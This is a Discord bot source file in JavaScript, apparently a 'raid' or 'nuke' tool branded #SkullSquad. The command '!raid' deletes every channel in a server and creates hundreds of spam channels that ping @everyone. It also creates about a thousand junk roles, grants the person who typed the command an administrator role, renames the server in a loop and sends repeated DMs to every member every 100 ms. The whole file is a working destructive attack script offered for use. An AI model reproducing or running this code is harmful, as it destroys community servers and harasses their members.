const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');
 
client.on("ready", () => {
 
  console.log(chalk.green("Iniciando bot raid."));
  console.log(chalk.green("Iniciando bot raid.."));
  console.log(chalk.green("Iniciando bot raid..."));
  console.log(chalk.green("#SkullSquad "));
 
 
console.log(chalk.greenBright(`   
 
´´´´´´´´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´´´´´´
´´´´´´´´´´´´´´´´´¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´
´´´´´´´´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´´´´´´´´´´´´´
´´´´´´´´´´´´´¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶¶´´´´´´´´´´´´´
´´´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´´´
´´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´´
´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´
´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´
´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´
´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´
´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´
´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´
´´´´´´´´´´´¶¶´¶¶´´´¶¶¶¶¶¶¶¶´´´´´´¶¶¶¶¶¶¶´´´¶¶´¶¶´´´´´´´´´´´
´´´´´´´´´´´´¶¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶¶¶´´´´´´´´´´´
´´´´´´´´´´´´´¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶´´´´´´´´´´´´´
´´´´¶¶¶´´´´´´´¶¶´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´¶¶´´´´´´´´¶¶¶¶´´
´´´¶¶¶¶¶´´´´´¶¶´´´¶¶¶¶¶¶¶´´´¶´¶´´´¶¶¶¶¶¶¶´´´¶¶´´´´´¶¶¶¶¶¶´´
´´¶¶´´´¶¶´´´´¶¶´´´´´¶¶¶´´´´¶¶¶¶¶´´´´¶¶¶´´´´´¶¶´´´´¶¶´´´¶¶´´
´¶¶¶´´´´¶¶¶¶´´¶¶´´´´´´´´´´¶¶¶´¶¶¶´´´´´´´´´´¶¶´´¶¶¶¶´´´´¶¶¶´
¶¶´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶´¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´¶¶
¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶´´´´¶¶¶´¶¶¶´´´´¶¶¶¶¶¶¶¶´´´´´´¶¶¶¶¶¶¶¶
´´¶¶¶¶´¶¶¶¶¶´´´´´´¶¶¶¶¶´´´´´´´´´´´´¶¶¶´¶¶´´´´´¶¶¶¶¶¶´¶¶¶´´´
´´´´´´´´´´¶¶¶¶¶¶´´¶¶¶´¶¶´´´´´´´´´´´¶¶´¶¶¶´´¶¶¶¶¶¶´´´´´´´´´´
´´´´´´´´´´´´´´¶¶¶¶¶¶´¶´´¶¶¶¶¶¶¶¶¶¶¶´¶¶´¶¶¶¶¶¶´´´´´´´´´´´´´´
´´´´´´´´´´´´´´´´´´¶¶´¶´¶¶´¶¶´¶´¶¶¶¶¶¶¶´¶¶´´´´´´´´´´´´´´´´´´
´´´´´´´´´´´´´´´´¶¶¶¶´¶¶´¶´¶¶´¶´¶¶´¶´¶¶´¶¶¶¶¶´´´´´´´´´´´´´´´
´´´´´´´´´´´´¶¶¶¶¶´¶¶´´´¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶´¶¶¶¶¶´´´´´´´´´´´´
´´´´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶´´´´´´´´´´´´´´´´´¶¶´´´´´´¶¶¶¶¶¶¶¶¶´´´´
´´´¶¶´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´´´¶¶´´´
´´´´¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶´´´´
´´´´´´¶¶´´´¶¶¶´´´´´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´´´´¶¶¶´´´¶¶´´´´´´
´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´
´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶¶´´´´´´´´
 
`));    
                                                                
 
 
 
console.log("                          ");  
console.log("   ")
  console.log(chalk.green(`[Cliente ${client.user.tag} listo para el raid!]`));  
  console.log(chalk.greenBright("[Bot creado por infecting#0006]"));   
  console.log("      ") 
  console.log("      ")
  console.log("      ")
  console.log("      ")
  console.log("      ")
  console.log(chalk.green(`[$] Comandos para el raid: 
[$] infectar (Raid) 
[$] fb?help "Help" 
[$] 
[$] 
[*] #Hacking
[*] https://www.youtube.com/Infecting`))
 
console.log("      ")
  
 
 
   presencia();  
    });
 
function presencia(){
  client.user.setPresence({
status: "online",
activity: {
  name: "#SkullSquad  -  https://discord.gg/skulls",
  type: "PLAYING"
 
}
  });
}
 
client.on("message", message => {
  if(message.author.bot) return;
 
  if(message.content === '!raid') {
    message.delete()
    message.guild.setIcon("https://cdn.discordapp.com/attachments/849130373102436363/849330810787725332/unknown.png");
    console.log("[$]", console.log("NUKE SUCCESFULLY"));
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`hker-shit`, {
      type: 'text'
    }).then(channel => {
      channel.send("@everyone - ESTE SERVER FUE DESTRUIDO POR SKULLSQUAD  -  https://discord.gg/skulls")
 
    })
  }
})
 
 
 
client.on("message", message => {
  if(message.author.bot) return;
 
  if(message.content === '!raid') {
    message.delete()
    console.log("[$]", console.log("RAID SUCCESFULLY"));
    for(let i = 0; i <= 500; i++) {
      message.guild.channels.create(`raided-by-hker-shit`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullrSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/skulls");
        
 
      })
    }
  }
})
 
 
client.on("message", message => {
if(message.author.bot) return;
 
if(message.content === '!raid') {
  message.delete()
  console.log("[$]", console.log("SPAM SUCCESFULLY"));
  for(let i = 0; i <= 500; i++) {
  message.channel.send("@everyone **SkullSquad Is Here** - https://discord.gg/Skulls")
}
}
})
 
 
client.on("message", message => {
  if(message.author.bot) return;
 
  if(message.content === '!raid') {
    message.delete()
    console.log("[$]", console.log("ROLES SUCCESFULLY"));
    for(let i = 0; i <= 500; i++) {
      message.guild.roles.create({data: {name: `#HackerSquad`,color: 'RED'},reason: 'por'})
      message.guild.roles.create({data: {name: `#Hker$h11t`,color: 'BLACK'},reason: 'geis'})
    }
  }
})
 
 
client.on("message", message => {
  if(message.author.bot) return;
 
  if(message.content === '!raid') {
    message.delete()
  console.log("[$]", console.log("ADMINISTRATOR SUCCESFULLY"));
    message.guild.roles.create({data: {name: `I$N$F$E$C$T$I$N$G`,color: 'WHITE',permissions: "ADMINISTRATOR"}}).then(role =>{
      message.member.roles.add(role.id)
    })
  }
})
 
 
client.on("message", message => {
  if(message.author.bot) return;
 
  if(message.content === '!raid') {
    message.delete()
    console.log("[$]", console.log("NICK LAG SUCCESFULLY"));
    for(let i = 0; i <= 500; i++) {
      message.guild.setName("RaidedBySkullSquad");
      message.guild.setName("RaidedBySkullSquad");
    }
  }
})
 
client.on("message", message => {
  if (message.author.bot) return;
  
if(message.content === "!raid")
message.delete()
console.log("[$]", console.log("MDALL SUCCESFULLY"));
message.guild.members.cache.forEach(member => {
  setInterval(function(){
    member.send("**Infecting is your god** - https://www.youtube.com/Infecting").catch(error => {});
  },100);
})
});
 
 
client.on("message", message => {
  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g );
  const command = args.shift().toLowerCase();
 if (command === 'fb?help') {
     message.delete()
     const embed = new Discord.MessageEmbed()
     .setTitle(message.guild.name)
     .setThumbnail()
     .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
     .setColor("RANDOM");
     message.channel.send(embed)
 }
});
 
 
 
 
 
 
client.login("TOKEN");
